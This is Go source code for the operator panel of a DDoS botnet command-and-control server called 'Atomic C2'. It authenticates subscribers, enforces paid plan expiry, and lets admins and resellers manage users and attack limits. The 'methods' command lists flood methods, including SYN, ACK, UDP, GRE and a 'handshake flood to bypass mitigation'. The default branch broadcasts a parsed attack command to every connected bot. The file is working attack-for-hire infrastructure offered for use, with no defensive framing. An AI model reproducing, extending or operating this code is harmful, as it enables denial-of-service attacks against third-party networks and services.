package main

import (
	"fmt"
	"math/rand"
	"net"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

type CaptchaToken struct {
	Token     string
	ValidTime time.Time
}

var captchaTokens = make(map[string]CaptchaToken)

func generateRandomCaptcha() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	tokenLength := 6
	rand.Seed(time.Now().UnixNano())

	token := make([]byte, tokenLength)
	for i := 0; i < tokenLength; i++ {
		token[i] = charset[rand.Intn(len(charset))]
	}

	return string(token)
}

func clear_screen(conn net.Conn) {
	ClearScreen(conn)
}

func show_banner(conn net.Conn) {
	ShowColoredBanner(conn)
}

// GenerateCaptcha generates a captcha token and returns it
func GenerateCaptcha() string {
	token := generateRandomCaptcha()
	validTime := time.Now().Add(5 * time.Minute)

	captchaTokens[token] = CaptchaToken{
		Token:     token,
		ValidTime: validTime,
	}

	return token
}

// admin function
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;Welcome to Atomic C2!\007")); err != nil {
		return
	}

	conn.Read(make([]byte, 32))

	// username
	username, err := Read(conn, ColorPrompt+"username: "+Reset, "", 20)
	if err != nil {
		return
	}

	account, err := FindUser(username)
	if err != nil || account == nil {
		conn.Write([]byte(ErrorMsg("User not found!") + "\r\n"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	// password
	password, err := Read(conn, ColorPrompt+"password: "+Reset, "*", 20)
	if err != nil {
		return
	} else if password != account.Password {
		conn.Write([]byte(ErrorMsg("Wrong password!") + "\r\n"))
		time.Sleep(50 * time.Millisecond)
		return
	}

	if strings.TrimSpace(username) != "root" {
		// Generate and display a captcha
		captcha := GenerateCaptcha()
		conn.Write([]byte(fmt.Sprintf("%sEnter Captcha %s%s%s: ", ColorInfo, Bold+Yellow, captcha, Reset)))

		// Read the user's captcha input
		captchaInput, err := Read(conn, "", "", 20)
		if err != nil || captchaInput != captcha {
			conn.Write([]byte(ErrorMsg("Captcha failed!") + "\r\n"))
			time.Sleep(50 * time.Millisecond)
			return
		}
	}

	if account.NewUser {
		conn.Write([]byte(WarningMsg("You must change your password") + "\r\n"))
		newpassword, err := Read(conn, ColorPrompt+"new password: "+Reset, "*", 20)
		if err != nil {
			return
		}

		if err := ModifyField(account, "password", newpassword); err != nil {
			conn.Write([]byte(ErrorMsg("Can't change password!") + "\r\n"))
			time.Sleep(50 * time.Millisecond)
			return
		}

		ModifyField(account, "newuser", false)
		conn.Write([]byte(SuccessMsg("Password changed successfully!") + "\r\n"))
		time.Sleep(1 * time.Second)
	}

	if account.Expiry <= time.Now().Unix() {
		conn.Write([]byte(ErrorMsg("Your plan has expired! Contact your seller to renew!") + "\r\n"))
		time.Sleep(10 * time.Second)
		return
	}

	session := NewSession(conn, account)
	defer delete(Sessions, session.Opened.Unix())

	clear_screen(conn)
	show_banner(conn)

	for {
		command, err := ReadWithHistory(conn, Prompt(session.User.Username), "", 60, session.History)
		clear_screen(conn)
		show_banner(conn)
		if err != nil {
			return
		}

		session.History = append(session.History, command)

		switch strings.Split(strings.ToLower(command), " ")[0] {

		case "clear", "cls", "c":
			session.History = make([]string, 0)
			clear_screen(conn)
			show_banner(conn)
			continue

		case "methods", "method", "syntax":
			item := MethodsFromMapToArray(make([]string, 0))
			sort.Slice(item, func(i, j int) bool {
				return len(item[i]) < len(item[j])
			})

			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".udpthread", Reset, DarkCyan, Reset, White, "UDP flood with threads", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".synflood", Reset, DarkCyan, Reset, White, "TCP flood with SYN flag", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".ackflood", Reset, DarkCyan, Reset, White, "TCP flood with ACK flag", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".ppsflood", Reset, DarkCyan, Reset, White, "UDP flood for high PPS", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".sackflood", Reset, DarkCyan, Reset, White, "Custom ACK flood", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".tcpsocket", Reset, DarkCyan, Reset, White, "TCP flood for high CPS", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".tcpstream", Reset, DarkCyan, Reset, White, "TCP custom flood for bypassing", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".stdhex", Reset, DarkCyan, Reset, White, "UDP flood with random hex", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".vseflood", Reset, DarkCyan, Reset, White, "Value Source Engine flood", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".greip", Reset, DarkCyan, Reset, White, "GRE IP flood", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n", Blue, ".tcpwra", Reset, DarkCyan, Reset, White, "TCP custom flood for games", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%s%s\r\n\r\n", Blue, ".stomp", Reset, DarkCyan, Reset, White, "Handshake flood to bypass mitigation", Reset)))

			session.Conn.Write([]byte(fmt.Sprintf("%s%s──────────────────────────────────────────────────────────%s\r\n", Dim, Gray, Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %sUsage:%s %s.udpthread 1.1.1.1 60 dport=80%s\r\n", ColorInfo, Reset, LightCyan, Reset)))
			session.Conn.Write([]byte(fmt.Sprintf("%s%s──────────────────────────────────────────────────────────%s\r\n", Dim, Gray, Reset)))

		case "?", "help", "h":
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", LightCyan, "ongoing", Reset, DarkCyan, Reset, White, "View all ongoing attacks", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", LightCyan, "methods", Reset, DarkCyan, Reset, White, "View all methods available", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", LightCyan, "bots", Reset, DarkCyan, Reset, White, "View different types of bots", Reset)))
			session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", LightCyan, "clear", Reset, DarkCyan, Reset, White, "Clear your terminal and history", Reset)))

			if session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "broadcast", Reset, Orange, Reset, White, "Broadcast message to all users", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "sessions", Reset, Orange, Reset, White, "View all active sessions", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "users", Reset, Orange, Reset, White, "View all users in database", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "create", Reset, Orange, Reset, White, "Create a new user", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "remove", Reset, Orange, Reset, White, "Remove user from database", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "attacks", Reset, Orange, Reset, White, "Enable/disable attacks", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "admin", Reset, Orange, Reset, White, "Modify user admin status", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "reseller", Reset, Orange, Reset, White, "Modify user reseller status", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "api", Reset, Orange, Reset, White, "Modify user API status", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "maxtime", Reset, Orange, Reset, White, "Modify user max time", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "cooldown", Reset, Orange, Reset, White, "Modify user cooldown", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "conns", Reset, Orange, Reset, White, "Modify user connections", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "max_daily", Reset, Orange, Reset, White, "Modify user max daily attacks", Reset)))
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-12s%s %s→%s  %s%s%s\r\n", Yellow, "days", Reset, Orange, Reset, White, "Modify user expiry", Reset)))
			}

		case "attacks":
			args := strings.Split(strings.ToLower(command), " ")[1:]
			if !session.User.Admin{
				session.Conn.Write([]byte(ErrorMsg("Only admin can use this command") + "\r\n"))
				continue
			}

			if len(args) == 0 {
				session.Conn.Write([]byte(InfoMsg("Usage: attacks <enable|disable|global|reset_user>") + "\r\n"))
				continue
			}

			switch strings.ToLower(args[0]) {
			case "enable", "active", "attacks":
				Attacks = true
				session.Conn.Write([]byte(SuccessMsg("Attacks have been enabled!") + "\r\n"))
			case "disable", "!attacks":
				Attacks = false
				session.Conn.Write([]byte(WarningMsg("Attacks have been disabled!") + "\r\n"))
			case "global":
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte(ErrorMsg("Include a new int for max") + "\r\n"))
					continue
				}

				new, err := strconv.Atoi(args[1])
				if err != nil {
					session.Conn.Write([]byte(ErrorMsg("Include a valid integer") + "\r\n"))
					continue
				}

				Options.Templates.Attacks.MaximumOngoing = new
				session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Global attack cap changed to %d", new)) + "\r\n"))

			case "reset_user":
				if len(args[1:]) == 0 {
					session.Conn.Write([]byte(ErrorMsg("Include a username") + "\r\n"))
					continue
				}

				if usr, _ := FindUser(args[1]); usr == nil {
					session.Conn.Write([]byte(ErrorMsg("Include a valid username") + "\r\n"))
					continue
				}

				if err := CleanAttacksForUser(args[1]); err != nil {
					session.Conn.Write([]byte(ErrorMsg("Failed to clean attack logs!") + "\r\n"))
					continue
				}

				session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Attack logs reset for %s", args[1])) + "\r\n"))
			}

			continue

		case "bots":
			if !session.User.Admin {
				session.Conn.Write([]byte(fmt.Sprintf("%sTotal Bots:%s %s%d%s\r\n", ColorInfo, Reset, Green, len(Clients), Reset)))
				continue
			}

			session.Conn.Write([]byte(fmt.Sprintf("%sTotal:%s %s%d%s bots connected\r\n", Bold+White, Reset, Green, len(Clients), Reset)))
			
			for source, amount := range SortClients(make(map[string]int)) {
				session.Conn.Write([]byte(fmt.Sprintf(" %s%-15s%s %s→%s  %s%d%s bots\r\n", LightCyan, source, Reset, DarkCyan, Reset, Green, amount, Reset)))
			}

			continue

		case "api":
			if !session.User.API && !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have API access!") + "\r\n"))
				continue
			} else if session.User.Admin || session.User.Reseller && session.User.API {
				args := strings.Split(command, " ")[1:]
				if len(args) <= 1 {
					session.Conn.Write([]byte(ErrorMsg("Usage: api <true/false> <username>") + "\r\n"))
					continue
				}

				status, err := strconv.ParseBool(args[0])
				if err != nil {
					session.Conn.Write([]byte(ErrorMsg("You must provide a valid boolean") + "\r\n"))
					continue
				}

				user, err := FindUser(args[1])
				if err != nil || user == nil {
					session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
					continue
				}

				if user.API == status {
					session.Conn.Write([]byte(WarningMsg("Status is already set to this value") + "\r\n"))
					continue
				}

				if err := ModifyField(user, "api", status); err != nil {
					session.Conn.Write([]byte(ErrorMsg("Failed to modify user's API status") + "\r\n"))
					continue
				}

				session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("API status changed to %v for %s", status, args[1])) + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(InfoMsg(fmt.Sprintf("Hello %s, you have API access!", session.User.Username)) + "\r\n"))

		case "admin":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: admin <true/false> <username>") + "\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid boolean") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if user.Admin == status {
				session.Conn.Write([]byte(WarningMsg("Status is already set to this value") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "admin", status); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's admin status") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Admin status changed to %v for %s", status, args[1])) + "\r\n"))
			continue

		case "reseller":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: reseller <true/false> <username>") + "\r\n"))
				continue
			}

			status, err := strconv.ParseBool(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid boolean") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if user.Reseller == status {
				session.Conn.Write([]byte(WarningMsg("Status is already set to this value") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "reseller", status); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's reseller status") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Reseller status changed to %v for %s", status, args[1])) + "\r\n"))
			continue

		case "maxtime":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: maxtime <seconds> <username>") + "\r\n"))
				continue
			}

			maxtime, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid number") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "maxtime", maxtime); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's maxtime") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Maxtime changed to %d seconds for %s", maxtime, args[1])) + "\r\n"))
			continue

		case "cooldown":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: cooldown <seconds> <username>") + "\r\n"))
				continue
			}

			cooldown, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid number") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "cooldown", cooldown); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's cooldown") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Cooldown changed to %d seconds for %s", cooldown, args[1])) + "\r\n"))
			continue

		case "conns":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: conns <number> <username>") + "\r\n"))
				continue
			}

			conns, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid number") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "conns", conns); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's connections") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Concurrent connections changed to %d for %s", conns, args[1])) + "\r\n"))
			continue

		case "max_daily":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: max_daily <number> <username>") + "\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid number") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "max_daily", days); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's max_daily") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Max daily attacks changed to %d for %s", days, args[1])) + "\r\n"))
			continue

		case "days":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You don't have access for this command!") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 1 {
				session.Conn.Write([]byte(ErrorMsg("Usage: days <number> <username>") + "\r\n"))
				continue
			}

			days, err := strconv.Atoi(args[0])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("You must provide a valid number") + "\r\n"))
				continue
			}

			user, err := FindUser(args[1])
			if err != nil || user == nil {
				session.Conn.Write([]byte(ErrorMsg("User doesn't exist") + "\r\n"))
				continue
			}

			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to modify user's expiry") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Expiry extended by %d days for %s", days, args[1])) + "\r\n"))
			continue

		case "create":
			if !session.User.Admin && !session.User.Reseller {
				session.Conn.Write([]byte(ErrorMsg("Only admins/resellers can create users!") + "\r\n"))
				continue
			}

			args := make(map[string]string)
			order := []string{"username", "password", "days"}
			for pos := 1; pos < len(strings.Split(strings.ToLower(command), " ")); pos++ {
				if pos-1 >= len(order) {
					break
				}

				args[order[pos-1]] = strings.Split(strings.ToLower(command), " ")[pos]
			}

			for _, item := range order {
				if _, ok := args[item]; ok {
					continue
				}
				value, err := Read(conn, ColorPrompt+item+": "+Reset, "", 40)
				if err != nil {
					return
				}
				args[item] = value
			}

			if usr, _ := FindUser(args["username"]); usr != nil {
				session.Conn.Write([]byte(WarningMsg("User already exists in database!") + "\r\n"))
				continue
			}

			expiry, err := strconv.Atoi(args["days"])
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("Days must be a valid integer!") + "\r\n"))
				continue
			}

			err = CreateUser(&User{
				Username: args["username"],
				Password: args["password"],
				Maxtime:  Options.Templates.Database.Defaults.Maxtime,
				Admin:    Options.Templates.Database.Defaults.Admin,
				API:      Options.Templates.Database.Defaults.API,
				Cooldown: Options.Templates.Database.Defaults.Cooldown,
				Conns:    Options.Templates.Database.Defaults.Concurrents,
				MaxDaily: Options.Templates.Database.Defaults.MaxDaily,
				NewUser:  true,
				Expiry:   time.Now().Add(time.Duration(expiry) * time.Hour * 24).Unix(),
			})

			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("Error creating user in database!") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("User '%s' created successfully!", args["username"])) + "\r\n"))
			continue

		case "remove":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You need admin access for this command") + "\r\n"))
				continue
			}

			args := strings.Split(command, " ")[1:]
			if len(args) <= 0 {
				session.Conn.Write([]byte(ErrorMsg("You must provide a username") + "\r\n"))
				continue
			}

			if usr, _ := FindUser(args[0]); usr == nil || err != nil {
				session.Conn.Write([]byte(ErrorMsg("Unknown username") + "\r\n"))
				continue
			}

			if err := RemoveUser(args[0]); err != nil {
				session.Conn.Write([]byte(ErrorMsg("Failed to remove user") + "\r\n"))
				continue
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("User '%s' removed successfully!", args[0])) + "\r\n"))
			continue

		case "broadcast":
			message := strings.Join(strings.Split(command, " ")[1:], " ")
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You need admin access for this command") + "\r\n"))
				continue
			}

			for _, s := range Sessions {
				s.Conn.Write([]byte(fmt.Sprintf("\x1b[0m\x1b7\x1b[1A\r\x1b[2K %s%s%s %s%s%s%s\x1b8",
					BgCyan, BgDark, Reset,
					Bold, Cyan, message, Reset)))
			}

			session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Broadcast sent to %d users", len(Sessions))) + "\r\n"))

		case "users":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You need admin access for this command") + "\r\n"))
				continue
			}

			users, err := GetUsers()
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("Error: "+err.Error()) + "\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Blue + "#" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "User" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Time" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Conns" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Cooldown" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "MaxDaily" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Admin" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Reseller" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "API" + Reset},
				},
			}

			for _, u := range users {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Yellow + fmt.Sprint(u.ID) + Reset},
					{Align: simpletable.AlignCenter, Text: LightCyan + fmt.Sprint(u.Username) + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprintf("%d", u.Maxtime) + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprintf("%d", u.Conns) + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprintf("%d", u.Cooldown) + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprintf("%d", u.MaxDaily) + Reset},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.Admin)},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.Reseller)},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.API)},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "ongoing":
			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Blue + "#" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Target" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Duration" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "User" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Finish" + Reset},
				},
			}

			ongoing, err := OngoingAttacks(time.Now())
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg("Can't fetch ongoing attacks") + "\r\n"))
				continue
			}

			if len(ongoing) == 0 {
				session.Conn.Write([]byte(InfoMsg("No ongoing attacks at the moment") + "\r\n"))
				continue
			}

			for i, attack := range ongoing {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Yellow + fmt.Sprint(i+1) + Reset},
					{Align: simpletable.AlignCenter, Text: LightCyan + attack.Target + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprint(attack.Duration) + "s" + Reset},
					{Align: simpletable.AlignCenter, Text: White + fmt.Sprint(attack.User) + Reset},
					{Align: simpletable.AlignCenter, Text: Green + fmt.Sprintf("%.1fs", time.Until(time.Unix(attack.Finish, 0)).Seconds()) + Reset},
				}

				new.Body.Cells = append(new.Body.Cells, row)
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		case "sessions":
			if !session.User.Admin {
				session.Conn.Write([]byte(ErrorMsg("You need admin access for this command") + "\r\n"))
				continue
			}

			new := simpletable.New()
			new.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Blue + "#" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "User" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "IP" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Admin" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "Reseller" + Reset},
					{Align: simpletable.AlignCenter, Text: Cyan + "API" + Reset},
				},
			}

			i := 1
			for _, u := range Sessions {
				row := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: Yellow + fmt.Sprint(i) + Reset},
					{Align: simpletable.AlignCenter, Text: LightCyan + fmt.Sprint(u.User.Username) + Reset},
					{Align: simpletable.AlignCenter, Text: Gray + strings.Join(strings.Split(u.Conn.RemoteAddr().String(), ":")[:len(strings.Split(u.Conn.RemoteAddr().String(), ":"))-1], ":") + Reset},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.User.Admin)},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.User.Reseller)},
					{Align: simpletable.AlignCenter, Text: FormatBoolColored(u.User.API)},
				}

				new.Body.Cells = append(new.Body.Cells, row)
				i++
			}

			new.SetStyle(simpletable.StyleCompactLite)
			session.Conn.Write([]byte(strings.ReplaceAll(new.String(), "\n", "\r\n") + "\r\n"))
			continue

		default:
			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
			if !ok && attack == nil {
				session.Conn.Write([]byte(fmt.Sprintf("%s`%s%s%s`%s doesn't exist! Type %shelp%s for commands.\r\n",
					Gray, Red, strings.Split(strings.ToLower(command), " ")[0], Gray, Reset,
					LightCyan, Reset)))
				continue
			}

			// Builds the attack command into bytes
			payload, err := attack.Parse(strings.Split(command, " "), account)
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg(fmt.Sprint(err)) + "\r\n"))
				continue
			}

			bytes, err := payload.Bytes()
			if err != nil {
				session.Conn.Write([]byte(ErrorMsg(fmt.Sprint(err)) + "\r\n"))
				continue
			}

			BroadcastClients(bytes)
			if len(Clients) <= 1 {
				session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Command broadcasted to %d active device!", len(Clients))) + "\r\n"))
			} else {
				session.Conn.Write([]byte(SuccessMsg(fmt.Sprintf("Command broadcasted to %d active devices!", len(Clients))) + "\r\n"))
			}
		}
	}
}

func FormatBool(b bool) string {
	return FormatBoolColored(b)
}
